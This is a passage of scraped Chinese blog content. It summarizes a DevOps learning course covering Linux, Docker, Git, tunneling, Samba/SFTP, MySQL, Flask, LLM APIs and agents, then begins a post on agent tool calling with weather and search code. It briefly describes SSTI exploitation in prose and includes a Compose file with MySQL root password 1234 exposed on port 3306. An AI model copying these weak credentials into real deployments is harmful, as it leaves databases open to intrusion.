\u0026ldquo;平滑重载\u0026rdquo;。不杀死主进程，只让主进程重读配置，并优雅地启动新的worker进程，旧的worker进程服务完当前请求后退出。服务不中断。 当修改了 nginx 上游配置时(比如 nginx.conf 里 load_module 路径）或 .service 文件，必须 restart 五、现代文件系统 以Btrfs为例：\n创建与挂载：通过虚拟磁盘模拟分区，用mkfs.btrfs格式化，mount命令挂载到指定目录，btrfs subvolume create创建子卷。 快照与回滚：btrfs subvolume snapshot -r创建只读快照；修改源文件后快照内容保持不变，通过删除源子卷并基于快照重新创建实现回滚。 什么是LVM？它相比传统分区的核心优势是什么？ LVM (Logical Volume Manager) 逻辑卷管理。它在物理磁盘(PV)和文件系统之间加了一个抽象层(VG, LV)。 核心优势: 弹性伸缩。可以轻松地扩容或缩容文件系统，甚至跨越多块物理磁盘。 描述一下LVM扩容一个已挂载目录 (e.g. /data) 的完整步骤。 (如有新硬盘) pvcreate /dev/sdc。 vgextend vg_data /dev/sdc (VG扩容)。 lvextend -L +100G /dev/vg_data/lv_data (LV扩容)。 resize2fs /dev/vg_data/lv_data (文件系统扩容, 假设是ext4)。 六、系统优化与维护 缓存与日志管理：journalctl --since \u0026quot;10 minute ago\u0026quot; | grep -E \u0026quot;error|fail\u0026quot;查看指定时间内含目标关键字的系统日志；journalctl --vacuum-time=7d清除超过7天的系统日志。 内核参数调整： sysctl net.core.somaxconn net.ipv4.tcp_max_syn_backlog查看TCP最大连接数限制参数。 sysctl -w net.core.somaxconn=50000临时修改参数值，sysctl -a验证生效。 影响：提升高并发Web服务器的连接处理能力，但会增加内存消耗，资源不足时可能导致系统不稳定。 内核模块内核模块通常放在哪个目录下？ /lib/modules/$(uname -r)/ 七、软件包与服务管理 安装命令的区别 dnf install \u0026lt;软件名\u0026gt;：从系统已配置的 软件仓库（repo） 中下载并安装软件包。 dnf localinstall \u0026lt;本地包文件.rpm\u0026gt;：安装本地已下载的 .rpm 包文件 无网络时自己配置镜像源：配置 /etc/yum.repos.d/local.repo Linux 防火墙 待补充\n服务器与 PC 硬件知识 PC 硬件基础 装机大致流程 CPU装主板 -\u0026gt; 涂硅脂 -\u0026gt; 装散热。 内存条插主板。 M.2 SSD 装主板。 主板装进机箱 (固定IO挡板)。 装电源，并连接主板供电、CPU供电。 (如有) 装显卡，连接显卡供电。 连接机箱跳线 (开机、重启、指示灯)。 理线，盖侧板。 服务器硬件 RAID 5: 至少3块盘，N-1容量，条带化+分布式奇偶校验。 优点：读性能好，空间利用率高。 缺点：写性能一般（有校验开销），一块盘坏后重建时性能差且风险高。 RAID 10: (RAID 1+0)，至少4块盘。先做RAID 1镜像，再做RAID 0条带。 优点：读写性能都很好，冗余性高（每组镜像坏一块盘仍可工作）。 缺点：空间利用率低 (50%)。 服务器的 ECC 内存条： 能检测并纠正单位比特的内存错误。服务器追求高稳定性，内存错误可能导致数据损坏或系统崩溃，所以必须用ECC。 会有一定性能开销（读写校验位），但完全值得 热插拔(Hot-Swap) 在服务器不关机的情况下，可以安全地移除或插入硬件。最常见的是热插拔硬盘和电源。 物理接口(SAS/SATA)支持 操作系统和RAID卡支持，允许在运行时\u0026quot;摘除\u0026quot;和\u0026quot;加入\u0026quot;设备 (e.g. echo 1 \u0026gt; /sys/block/sda/device/delete)。 shell 基础 御林招新题：shell 入门\n一、重定向与管道 三大标准流概念 标准输入（stdin）：默认从键盘获取输入。 标准输出（stdout）：默认输出到终端，展示程序正常结果。 标准错误（stderr）：默认输出到终端，展示程序错误信息。 输出重定向 \u0026gt;：覆盖式重定向标准输出到文件，文件不存在则创建。 \u0026gt;\u0026gt;：追加式重定向标准输出到文件。 2\u0026gt;：覆盖式重定向标准错误到文件。 2\u0026gt;\u0026gt;：追加式重定向标准错误到文件。 管道操作：| 将前一个命令的标准输出作为后一个命令的输入，如 ls | grep 'txt' 筛选出含 “txt” 的文件名。 二、变量与引号 变量操作 定义：变量名=值（等号两侧无空格）。 引用：$变量名 或 ${变量名}。 取消定义：unset 变量名。 引号区别 单引号 ' '：完全原样输出内容，不进行变量、命令替换。 双引号 \u0026quot; \u0026quot;：支持变量替换和命令替换（配合 $() 或反引号）。 反引号 ：执行内部命令并返回输出结果，推荐用 $() 替代以支持嵌套。 三、参数与条件判断 命令行参数\n$1~$n：对应第 1 到第 n 个命令行参数。 $#：参数总个数；$0：脚本文件名。 $*：将所有参数视为单个字符串；$@：将每个参数视为独立字符串。 条件判断\n基础语法： 1 2 3 4 5 6 7 if [条件1]; then # 条件1为真时执行的命令 elif [条件2]; then # 条件2为真时执行的命令 else # 所有条件都为假时执行的命令 fi test 命令和 []（方括号）在 Shell 中用于进行条件测试，可以对文件、字符串、数字等进行比较。[] 是 test 命令的另一种写法，使用起来更简洁。\n文件：-e（存在）、-f（普通文件）、-d（目录）等。 字符串：=（相等）、!=（不等）、-z（空字符串）等。 数字：-eq（相等）、-gt（大于）、-lt（小于）等。 四、循环 for 循环 遍历元素：for 变量 in 元素1 元素2...; do 命令; done。 范围遍历：for 变量 in {起始值..结束值}; do 命令; done。 while 循环：while 条件; do 命令; done，条件为真时重复执行循环体。 关键注意点 参数判断需用双引号包裹变量，避免空格等特殊字符问题。 遍历目录文件需用 \u0026quot;$1\u0026quot;/* 表示目录下所有内容。 echo -n 可取消默认换行，按需手动添加换行保证格式整洁。 .bashrc 和 .bash_profile 的差别？\n.bash_profile: 只在 \u0026ldquo;Login Shell\u0026rdquo; (登录Shell，如SSH登入) 时加载一次。 .bashrc: 在 \u0026ldquo;Interactive Non-Login Shell\u0026rdquo; (交互式非登录Shell，如打开新终端窗口) 时加载。 alias 是什么？\n简化命令的配置，写入用户 .bashrc 等配置文件\n如果加在了 .bashrc，在系统SSH登入时只加载 .bash_profile，.bash_profile 需要 source ~/.bashrc。\n1 2 3 if [ -f ~/.bashrc ]; then . ~/.bashrc fi 脚本开头 set -e / set - u\nset -e: \u0026quot;Exit on Error\u0026quot;。脚本中任何命令返回非0退出码（即出错）时，立即退出。 set -u: \u0026quot;Unbound Variable\u0026quot;。试图使用未定义的变量时，视为错误并退出。 screen 和 tmux 的作用？\n会话保持：SSH断开连接后，服务器上的任务（如编译、跑脚本）不会中断。\n多路复用：在一个终端窗口中创建多个\u0026quot;窗口\u0026quot;和\u0026quot;窗格\u0026quot;，方便同时操作。\n操作 screen 命令 / 快捷键 tmux 命令 / 快捷键 新建会话 screen 或 screen -S 会话名 tmux 或 tmux new -s 会话名 列出所有会话 screen -ls tmux ls 或 tmux list-sessions 断开当前会话 Ctrl + a + d Ctrl + b + d 重新连接会话 screen -r 会话名/ID tmux attach -t 会话名/ID 新建窗口 Ctrl + a + c Ctrl + b + c 垂直拆分面板 需额外配置 Ctrl + b + % 横向拆分面板 需额外配置 Ctrl + b + \u0026quot; Git版本管理 御林招新题：Git 版本管理\n一、安装与配置 安装验证：在Linux系统安装Git后，通过git --version命令确认安装成功。 全局配置：配置提交者信息，命令如下： git config --global user.name \u0026quot;用户名\u0026quot; git config --global user.email \u0026quot;邮箱地址\u0026quot; 二、仓库创建与克隆 本地仓库：在目标文件夹中初始化Git仓库（具体命令未明确给出，常规为git init）。 远程克隆：使用git clone 远程仓库地址克隆公开仓库到本地，例如git clone https://github.com/calendar0917/learning_log.git。 代理配置：可通过clashctl on开启代理、clashctl off关闭代理等命令配置网络代理以解决克隆问题。 三、文件提交与同步 暂存与提交 git add 文件名：将修改文件添加到暂存区。 git commit -m \u0026quot;提交信息\u0026quot;：提交暂存区文件并添加说明。 凭据缓存：配置Git凭据缓存避免重复登录，命令如下： git config --global credential.helper cache（默认缓存15分钟） git config --global credential.helper 'cache --timeout=2592000'（自定义缓存时间，如30天） 远程同步 git pull：从远程仓库拉取最新变更。 git push：将本地提交推送到远程仓库，需输入用户名及Personal Access Token验证。 四、分支管理 分支操作 创建分支：git branch 分支名（如git branch feature-a）。 切换分支：git checkout 分支名。 创建并切换分支：git checkout -b 分支名。 修改与合并 在分支上修改文件后，执行git add和git commit提交变更。 切换回主分支（main/master），通过git merge 分支名合并分支修改。 分支删除：合并完成后，用git branch -d 分支名删除分支。 五、历史记录与回溯 查看历史：git log命令查看提交历史，包含提交ID、作者、时间及提交信息。 核心概念 工作区：实际存放项目文件的可见目录。 暂存区：临时保存文件修改的区域，通过git add添加文件至此。 版本回溯 git revert 提交ID：创建新提交抵消目标提交的修改，不改变历史记录。 git reset：重置HEAD指针到指定版本，不同模式效果不同： --hard：重置HEAD指针、暂存区和工作区。 --soft：仅重置HEAD指针，保留暂存区和工作区内容。 --mixed：重置HEAD指针和暂存区，保留工作区内容。 六、远程仓库进阶 添加远程仓库：git remote add 仓库别名 仓库地址，例如git remote add gitee https://gitee.com/calendar917/learning_log.git。 查看远程仓库：git remote -v查看已配置的远程仓库信息。 多仓库同步：git push 仓库别名 分支名将本地分支推送到指定远程仓库，如git push gitee main。 Docker入门 御林招新题：docker 入门\n一、安装与配置 安装验证：在Linux系统安装Docker Engine后，通过docker version和docker info命令确认安装与配置正常。 镜像源配置：配置国内镜像源以提升镜像下载速度。 二、运行容器 基础容器操作 拉取镜像：docker pull 镜像名，例如docker pull hello-world。 运行容器：docker run 镜像名，如docker run hello-world可观察容器输出。 进阶容器运行 拉取并运行searxng容器：docker pull searxng/searxng，docker run -d -p 8080:8080 searxng/searxng。 关键参数：-d（后台运行）、-p 主机端口:容器端口（端口映射）、-v 主机目录:容器目录（数据卷挂载）、--name（指定容器名）、-it（交互式运行）。 验证：浏览器访问http://localhost:8080确认searxng服务正常。 三、核心概念 镜像（Image）：类似不可修改的安装包，整合了应用所需的运行环境。 容器（Container）：基于镜像创建的可操作实例，是独立隔离的沙箱环境，支持启动、删除等操作。 Dockerfile：自动化构建镜像的配置文件，可编写镜像所需环境，替代手动安装操作。 四、Docker Compose 工具作用：Docker官方工具，用于定义和运行多容器应用，可统一管理多个容器的启停、网络配置及数据卷挂载，解决多容器协同操作的繁琐问题。 配置文件：docker-compose.yml是核心配置文件，可定义服务（指定镜像、端口映射等）、网络（实现容器间通信）、数据卷（实现数据共享）。 五、编写Dockerfile 功能需求 基于最新ubuntu镜像，安装nginx并设置其在容器启动时自动运行。\n实现代码 1 2 3 4 5 FROM ubuntu:latest RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y nginx \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] 操作与验证 构建镜像：docker build -t my-ubuntu-nginx .。 运行容器：docker run -d -p 80:80 my-ubuntu-nginx。 说明：Ubuntu镜像为精简根文件系统，共享宿主机Linux内核，体积小无需完整下载。 六、Docker Compose部署多服务 功能需求 部署nginx服务（端口映射8081:80）和mysql服务（设置root密码）。\n配置文件（docker-compose.yml） 1 2 3 4 5 6 7 8 9 10 11 12 version: \u0026#39;3\u0026#39; services: nginx-service: image: nginx:latest ports: - \u0026#34;8081:80\u0026#34; mysql-service: image: mysql:latest environment: MYSQL_ROOT_PASSWORD: 1234 ports: - \u0026#34;3306:3306\u0026#34; 操作与验证 启动服务：docker compose up -d。 确认运行：docker ps查看两个容器的运行状态。 Docker进阶 御林招新题：docker 进阶\n一、多阶段构建 概念与优势：在单个Dockerfile中定义多个构建阶段，构建阶段使用含编译、打包工具的完整镜像完成构建操作，运行阶段使用轻量级镜像仅复制构建产物，可剔除冗余内容，大幅精简镜像体积。 实战案例（打包Python Flask应用） 构建阶段：基于python:3.9镜像，设置工作目录，复制并安装依赖，复制应用代码。 运行阶段：基于python:3.9-slim轻量镜像，从构建阶段复制依赖文件、应用代码及安装好的依赖包，暴露端口并启动应用。 关键说明：直接使用轻量镜像单阶段构建可能因缺少编译工具导致依赖安装失败；可通过临时容器或单阶段容器输出依赖路径，确定需复制的文件路径。 效果验证：多阶段镜像（148MB）远小于单阶段镜像（1.1GB），差异源于基础镜像精简及冗余内容剔除。 二、镜像版本管理与标签 标签操作：使用docker tag \u0026lt;镜像ID\u0026gt; 镜像名:\u0026lt;标签\u0026gt;为镜像打标签，例如为多阶段镜像添加1.0.0和latest标签。 验证方式：通过docker images命令查看镜像标签是否正确应用，同一镜像可对应多个标签。 三、镜像的打包与加载 打包镜像：docker save -o 文件名.tar 镜像名:标签，将指定镜像打包为tar文件，用于无Docker Registry环境下的镜像迁移。 加载镜像：先通过docker rmi 镜像名:标签删除本地原有镜像，再用docker load -i 打包文件.tar加载镜像。 验证步骤：执行docker images确认镜像加载成功，运行镜像验证其可用性。 四、推送到私有仓库 操作流程 启动本地临时Docker Registry容器。 用docker tag命令为镜像添加指向私有仓库的标签（如localhost:5000/your-app:1.0.0）。 执行docker push将镜像推送到私有仓库。 用docker pull从私有仓库拉取镜像，验证推送与拉取流程。 补充说明：删除多标签镜像时，仅删除指定标签，直至最后一个标签删除才会彻底删除镜像；多容器应用（基于Docker Compose）可在配置文件目录下用docker compose stop统一停止。 内网穿透与流量转发 御林招新题：内网穿透与流量转发专题\n一、Nginx 反向代理 概念：客户端向反向代理服务器发请求，代理服务器转发至内网实际服务器，再将响应返回客户端，客户端无需知晓内网服务详情，Nginx 可承担该角色。 实操步骤 在公网服务器安装 Nginx。 修改配置文件，添加 server 块，通过 proxy_pass 指令将请求转发到内网服务的 IP 和端口，同时配置请求头传递参数。 验证：通过公网 IP 访问 Nginx 服务器，确认能显示内网服务页面。 二、Autossh 端口转发 核心作用：封装 SSH 工具，自动监控并重建断开的 SSH 反向隧道，保证连接持久性，实现内网端口暴露到公网。 实操步骤 内网机器安装 Autossh，生成 SSH 公钥并上传至公网服务器。 执行命令建立反向隧道：autossh -M 20000 -fCNR public_server_ip:8000:localhost:5000 root@public_server_ip。 关键配置：修改公网服务器 sshd_config 中 GatewayPorts 为 yes，开放安全组对应端口。 验证：访问公网服务器的指定端口，确认能连接内网服务。 三、Tailscale 零配置网络 概念：搭建零配置虚拟私有网络（VPN），简化配置流程，实现不同网络环境设备的点对点互联。 实操步骤 在公网服务器和内网机器分别安装 Tailscale，注册并登录账户加入网络。 查看设备的 Tailscale IP，通过该 IP 直接访问内网服务。 验证：在公网服务器上通过内网机器的 Tailscale IP 访问其服务，无需端口转发。 四、Frp (Fast Reverse Proxy) 概念：高性能内网穿透反向代理应用，采用客户端-服务端模式暴露内网服务。 实操步骤 下载 Frp 安装包，在公网服务器部署服务端（frps），内网机器部署客户端（frpc）。 配置服务端 frps.ini 的通信端口，客户端 frpc.ini 的服务端地址、本地服务地址及公网映射端口（建议用 TCP 类型避免域名依赖）。 分别启动服务端和客户端程序。 验证：通过公网服务器的 IP 和配置的映射端口，访问内网服务。 文件服务器 御林招新题：文件服务器\n一、文件共享协议理解 SMB/CIFS 作用：局域网内实现文件、打印机等资源共享，Windows 网络原生支持，访问方式接近本地文件。 典型场景：企业 Windows 办公网络共享文档、学校计算机教室共享教学资料。 特点：局域网传输高效、使用便捷，但安全性不足。 SFTP 作用：基于 SSH 协议的安全文件传输协议，传输过程加密，保障数据安全。 典型场景：Linux 服务器间文件备份同步、开发者向远程 Linux 服务器上传代码/下载日志。 特点：跨平台兼容性好、传输稳定可靠，但加密会消耗性能，功能专注于文件传输。 二、Samba 服务配置（SMB/CIFS） 实操步骤 安装：sudo yum install samba samba-client samba-common。 创建用户：sudo useradd sambauser，sudo smbpasswd -a sambauser 设置 Samba 密码。 配置共享：创建共享目录并设置权限，修改 /etc/samba/smb.conf，添加共享配置（指定路径、授权用户等），重启服务 sudo systemctl restart smb nmb。 验证：局域网内 Windows/macOS 设备通过 \\\\服务器IP 访问共享目录，测试文件上传。 三、SFTP 服务配置 实操步骤 准备：安装 SSH 服务 sudo yum install openssh-server，启动服务 sudo systemctl start sshd。 创建用户：sudo useradd sftpuser，sudo usermod -s /sbin/nologin sftpuser 限制 Shell 登录。 配置服务：备份并修改 /etc/ssh/sshd_config，注释原有 SFTP 配置，启用 internal-sftp，匹配用户并限制访问目录，重启 SSH 服务。 验证：使用 FileZilla 等客户端连接，测试文件上传，确认无法执行 Shell 命令。 注意：需将用户主目录权限设为 755 且归属 root，检查配置文件语法避免报错。 四、权限精细化管理 实操步骤 创建组：sudo groupadd sambagrp（系统组）、sudo smbgroupadd sambagrp（Samba 组）。 配置共享目录：创建目录并设置组归属及权限，修改 smb.conf 添加组共享配置，限制仅组内用户读写。 添加用户：创建新用户并加入组，设置 Samba 密码，重启服务。 验证：组内用户可正常读写，非组用户被拒绝访问。 五、WebDAV 配置 实操步骤 安装配置：基于 Nginx 部署，下载并编译安装 Nginx 及 nginx-dav-ext-module 插件，配置系统服务。 基础配置：修改 Nginx 配置文件，设置监听端口、认证文件、共享目录及 WebDAV 相关指令，创建认证用户和共享目录。 验证：Windows 设备修改注册表并重启 WebClient 服务后，通过网络位置访问，输入凭据管理文件。 六、性能与安全性 性能测试：使用工具测试大文件传输速度，Samba 传输效率通常高于 SFTP（因 SFTP 加密消耗性能）。 安全加固 配置 SFTP 密钥认证：生成密钥对，将公钥放入服务器用户的 authorized_keys 文件，禁用密码登录（PasswordAuthentication no）。 安全优势：密钥认证采用非对称加密，私钥仅存于客户端，可防范密码暴力破解、泄露等风险，安全性远超密码认证。 Homepage 御林招新题：Homepage\n一、安装与基础配置 安装方式：推荐使用Docker Compose安装，编写docker-compose.yml文件，指定Homepage镜像、容器名称、环境变量、端口映射及配置文件挂载目录，执行docker-compose up -d启动服务。安装过程中需解决依赖问题（如加装pip3、rust环境等）。 配置调整：创建本地配置目录并挂载，通过修改环境变量HOMEPAGE_ALLOWED_HOSTS解决主机验证问题（可临时设为“*”禁用验证）；修改配置文件设置主页标题（如“我的DevOps控制台”），支持热加载生效。 二、服务添加与验证 基础服务配置：编辑service.yaml文件，按分组添加服务，配置服务名称、图标、访问链接及描述，支持添加自有服务（如Searxng）或常用网站（如GitHub、个人博客）。 验证步骤：重启Homepage服务，通过浏览器访问确认标题修改成功，服务图标可正常点击并跳转至目标页面。 三、进阶服务与集成 状态检查服务：在服务配置中添加siteMonitor参数（指定服务访问地址），实现对服务在线状态的自动检查，如配置Searxng服务的状态监控。 Docker集成：启用Docker socket挂载，安装Portainer可视化工具并配置端口映射，在Homepage中添加Portainer服务，通过配置widget实现容器状态（运行数量、CPU/内存占用等）的展示。 四、小部件定制 基础小部件添加：参考文档配置小部件，例如添加时间小部件，通过设置text_size和format参数自定义显示样式。 实用小部件集成：借助Portainer与Homepage的整合能力，实现Docker容器状态的可视化监控，需解决端口映射、认证配置等问题。 五、主题与布局自定义 布局调整：修改setting.yaml文件，通过layout参数调整服务分组的排列样式（如将单列改为双列）。 主题与样式修改：更换默认主题，或编辑配置目录下的custom.css文件，通过CSS选择器自定义元素样式（如修改服务组名称颜色），可通过浏览器开发者工具定位目标元素类名。 MySQL专题 御林招新题：MySQL专题\n一、安装与配置 安装方式 方法一：通过官方源安装，先下载并安装MySQL 5.7官方源包，再用yum安装服务，最后启动服务并执行安全脚本。 方法二：通过tar包安装，解压包后创建用户组和用户，配置目录权限与my.cnf文件，初始化数据库并启动服务，配置系统服务实现管理。 安全配置：执行mysql_secure_installation安全脚本，设置root密码，删除不安全用户和数据库。 验证登录：配置MySQL命令软链接，使用mysql -u root -p命令登录数据库命令行。 二、数据库操作与管理 基础操作 建库建表：CREATE DATABASE test_db;创建数据库，CREATE TABLE students (...)创建含id、name、score字段的表。 数据插入：INSERT INTO students (name, score) VALUES (...)插入数据。 数据导入导出 导出：mysqldump -u root -p test_db \u0026gt; test_db_backup.sql将数据库导出为SQL文件。 导入：先删除数据库并重建，再执行mysql -u root -p test_db \u0026lt; test_db_backup.sql恢复数据。 三、数据库性能调优 关键参数修改 innodb_buffer_pool_size：设置InnoDB缓冲池大小（示例设为2G），用于缓存表数据和索引数据，提高查询性能。 max_connections：设置最大并发连接数（示例设为500），过小会拒绝连接，过大占用过多系统资源。 配置生效：修改/etc/my.cnf配置文件后重启MySQL服务，通过SHOW VARIABLES LIKE '参数名'验证配置。 四、应用程序集成与数据处理 Python集成示例 依赖库：使用pymysql库连接数据库，csv库处理文件。 核心功能：连接数据库查询students表数据，计算学生平均分数，将数据及平均分写入report.csv文件。 安全注意：采用参数化查询防止SQL注入，操作完成后关闭游标和连接。 关键操作：通过游标执行SQL语句，使用fetchall()获取数据，借助csv.writer写入文件。 五、自动化备份与恢复 备份脚本编写 脚本功能：使用mysqldump命令备份指定数据库，为备份文件添加时间戳，检查备份结果并输出日志。 权限设置：执行chmod +x mysql_backup.sh为脚本添加执行权限。 定时执行：通过crontab -e添加定时任务，设置脚本每天凌晨1点自动运行。 验证测试：手动执行脚本，确认备份文件生成；通过top或htop命令查看系统资源占用情况。 Python后端 御林招新题：python 后端\n一、Flask框架 （一）基础应用开发 简单应用创建：定义首页路由/和带参数路由/hello/\u0026lt;name\u0026gt;，实现个性化问候功能。 服务器端模板注入（SSTI）漏洞 漏洞成因：将用户输入直接拼接进模板，通过render_template_string渲染执行恶意代码。 漏洞防护：设置黑名单过滤危险字符，或采用安全写法将参数传入模板而非拼接。 漏洞利用：通过构造特定代码（如利用类继承关系调用系统函数）执行恶意操作。 （二）核心功能用法 请求与响应：通过request模块获取表单、查询字符串、路径等参数；使用make_response自定义响应内容、状态码和响应头；通过render_template渲染模板并返回。 会话管理：设置app.secret_key密钥，利用session对象存储会话数据，实现用户登录状态保持与页面跳转。 模板语法：支持变量替换、条件判断、循环遍历等功能，可动态渲染页面内容。 二、FastAPI与Sanic框架基础 （一）应用创建与路由 FastAPI 基础路由：定义/路由处理GET请求，/items/{item_id}路由处理POST请求。 数据校验：借助Pydantic模型定义数据结构，自动完成POST请求数据的校验。 Sanic 基础路由：创建/路由（GET请求）和/items/{item_id}路由（POST请求）。 数据处理：手动获取请求体数据并处理，需自行实现数据校验逻辑。 框架区别：FastAPI支持自动数据校验，开发效率高；Sanic基于异步非阻塞架构，性能更优。 三、异步编程实践 （一）异步路由\n在FastAPI中创建异步路由/async-task，使用asyncio.sleep模拟耗时操作，验证其非阻塞特性，对比同步路由可知异步操作不会阻塞其他请求。\n（二）异步依赖注入\n依赖函数创建：编写异步依赖函数（如模拟数据库连接），通过yield管理资源生命周期（创建→使用→清理）。 核心概念 await：仅在异步函数中使用，暂停当前协程等待异步操作完成，不阻塞事件循环。 yield：创建生成器，中断函数并返回中间结果，后续可从断点继续执行，用于资源管理。 应用场景：匹配异步编程模型，避免数据库等IO操作阻塞应用，提升并发处理能力。 四、项目结构与APIRouter （一）路由模块化 模块拆分：将API按功能拆分为users和items等模块，分别在不同文件中定义路由。 APIRouter使用：每个模块创建APIRouter实例，定义该模块的路由与业务逻辑，在主应用中通过include_router注册路由并添加前缀。 （二）项目结构示例 1 2 3 4 5 project/ ├── main.py # 主应用入口，注册路由 ├── routers/ # 路由模块文件夹 │ ├── users.py # 用户相关路由 │ └── items.py # 商品相关路由 五、中间件与生命周期管理 （一）自定义中间件 为FastAPI应用添加HTTP中间件，记录每个请求的处理耗时并打印到控制台，中间件在请求到达路由前和响应返回客户端前执行。\n（二）应用生命周期管理 替代on_event钩子：使用lifespan上下文管理器，更优雅地处理应用启动和关闭逻辑，支持异常捕获与资源清理。 资源初始化与销毁：在启动阶段创建数据库连接池并存储在app.state中，应用关闭时安全关闭连接池，确保资源合理释放。 LLM专题 御林招新题：LLM 专题\n一、准备工作 账号与API Key获取：注册LLM服务提供商账号（如硅基流动、阿里云百炼），申请并获取对应API Key，注意不同地域的API Key可能存在差异。 二、编程调用API 环境准备：选用Python语言，安装openai库。 脚本编写：配置客户端（指定API Key和base_url），构造请求参数（选择模型、设置对话消息），发送请求并解析返回结果，打印模型回复。 示例模型：选用qwen-plus等模型，可通过官方文档查询支持的模型列表。 三、模型能力探索 多模型对比：调用至少三种不同模型（如qwen-plus、qwen-max、deepseek-v3.2-exp），针对同一问题提问。 差异分析：从回答风格（结构化程度、语言简洁度）、准确性（内容完整性、专业性）、响应速度及内容深度等维度对比模型表现。 四、构建命令行聊天机器人 核心功能 交互循环：通过无限循环持续接收用户输入，并发送给LLM。 流式输出：配置stream=True实现模型回复的实时流式打印。 退出机制：用户输入quit或exit时，程序优雅退出。 关键实现：处理流式响应的分块内容，过滤空片段，确保输出格式整洁。 五、提示词工程（Prompt Engineering） 角色扮演：修改系统提示词，让模型扮演特定角色（如Linux导师、幽默段子手），引导模型输出符合角色设定的内容。 指令遵循：下达复杂指令，要求模型按指定格式（如Markdown）输出内容（如整理Linux命令及示例）。 输出限制：在提示词中明确约束回答的长度（如100字以内）或格式，规范模型输出结果。 Agent专题 一、工具调用实现 （一）工具设计与开发 天气查询工具 功能：接收城市名参数，调用第三方天气API（如聚合数据API），返回指定城市的实时天气（温度、天气状况、湿度）。 实现：通过requests库发送HTTP请求，解析返回的JSON数据，格式化输出结果，包含异常处理机制。 网络搜索工具 功能：接收关键词参数，调用DuckDuckGo免费搜索API，返回搜索结果摘要（优先提取摘要信息，补充相关主题内容）。 实现：配置API请求参数，处理网络异常和JSON解析异常，过滤无效结果并整理输出。 （二）工具调用流程 配置LLM客户端（基于openai库，对接阿里云百炼等服务），在请求中声明工具列表及参数规范。 LLM自动识别用户需求，生成工具调用指令，包含工具名称和参数。 解析工具调用指令，执行对应工具函数，将结果回传给LLM，由LLM整理为自然语言回答。 二、记忆功能实现 核心原理：通过messages列表存储历史对话内容，包括用户输入、LLM响应（含工具调用记录）和工具执行结果。 交互应用：后续对话中，LLM可从历史记录中提取上下文信息（如用户之前询问的城市），实现追问响应（如用户问“那明天呢？”可关联之前的天气查询需求）。 三、多Agent协同工作 （一）角色设计 Agent A（规划者）：负责任务拆解、工具分配和结果整合，接收用户请求后分解为子任务，指定对应工具及参数，等待执行结果并生成最终回答。 Agent B（执行者）：专注于工具调用执行，接收Agent A的指令，严格调用指定工具，返回原始执行结果，不添加额外处理。 （二）协同流程 用户提交复合任务（如“查北京明天天气及著名IT公司”）。 Agent A拆解为两个子任务，分别分配给Agent B执行。 Agent B调用对应工具（天气查询、网络搜索）并返回结果。 Agent A整合子任务结果，以流畅语言回复用户。 关键保障：设计统一的消息传递机制，明确角色分工的提示词，确保指令传递和结果反馈准确。 四、知识库集成 （一）知识库构建 存储形式：以Markdown文件为载体，按标题分割知识条目，包含标题和正文内容。 语义处理：使用paraphrase-multilingual-MiniLM-L12-v2预训练模型，将知识条目转化为向量嵌入，便于语义检索。 （二）检索与集成 检索逻辑：接收用户查询关键词，生成查询向量，通过余弦相似度计算匹配最相关的知识条目（设置相似度阈值过滤无效结果）。 系统集成：将知识库查询作为工具加入工具列表，Agent A优先调用该工具回答特定领域问题（如技术概念），提升回答的精准性和定制化程度。 ","date":"2025-10-21T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-devops%E5%85%A5%E9%97%A8%E5%B0%8F%E7%BB%93/","title":"御林-DevOps入门小结"},{"content":"实现工具调用（Tool Calling） 设计工具：你必须实现至少两个工具。当用户提出相关需求时，你的 Agent 必须能够识别并调用相应的工具。\nqwen 的工具调用整合了 OpenAI，所以可以看 OpenAI 的使用文档：函数调用 - OpenAI 中文文档，写得比较简略；openai-python/api.md at main · openai/openai-python 仓库，详细但是冗杂\n基本步骤：\n创建助手，以调用外部 API 来回答问题（定义函数） 将自然语言转换为 API 调用 从文本中提取结构化的数据 工具1：天气查询工具\n可以使用爬虫实现，也可以寻找相应的api提供商\n功能：接受城市名作为参数。 返回：指定城市的实时天气信息，包括温度、天气状况（晴、多云、雨等）和湿度。 用户交互示例：当用户问“北京今天天气怎么样？”时，Agent 必须识别出“北京”并调用此工具，然后返回天气信息。 注册接口：天气预报查询接口_天聚地合\n1 2 3 4 5 6 7 8 9 10 11 WEATHER_API_KEY = \u0026#34;...\u0026#34; def get_weather(city: str) -\u0026gt; str: url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; response = requests.get(url) data = response.json() if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; 工具2：网络搜索工具\n可以使用Searxng，也可以使用其它专业的api\n功能：接受关键词作为参数。 返回：基于关键词的网络搜索结果摘要。 用户交互示例：当用户问“2024 年奥运会在哪里举办？”时，Agent 能够使用此工具进行搜索并给出答案。 试了自己的 searxng，可能是格式问题跑不通，换了个 API\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def web_search(query: str) -\u0026gt; str: # DuckDuckGo 免费搜索 API（无需注册，直接使用） url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, # 不返回 HTML 内容 \u0026#34;no_redirect\u0026#34;: 1 # 不返回跳转链接 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() # 检查 HTTP 状态码（如 404、500 会报错） except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except requests.exceptions.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的 